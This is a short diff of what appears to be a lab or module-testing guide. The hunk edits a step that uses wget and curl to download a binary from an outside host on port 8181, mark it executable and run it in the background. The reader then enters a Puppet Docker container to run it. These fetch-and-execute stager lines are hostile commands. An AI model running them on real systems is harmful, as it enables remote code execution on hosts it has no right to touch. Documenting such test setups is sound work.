@@ -79,7 +79,7 @@ wget -qO CmKyTd1N --no-check-certificate http://1.1.1.1:8181/Gc7zrm8CdKGSe2; chm
 ```
 
 We now have a `wget` command, however the system doesn't have `wget`. Alter it to a `curl`
-command similar to `curl -k http://1.1.1.1:8181/Gc7zrm8CdKGSe2 > uBgZi2eZ; chmod +x uBgZi2eZ; ./uBgZi2eZ& disown`
+command similar to `curl http://1.1.1.1:8181/Gc7zrm8CdKGSe2 > uBgZi2eZ; chmod +x uBgZi2eZ; ./uBgZi2eZ& disown`
 
 You'll now need to get on the docker image: `docker exec -it puppet_puppet_1 /bin/bash` and run the `curl`` command.
 
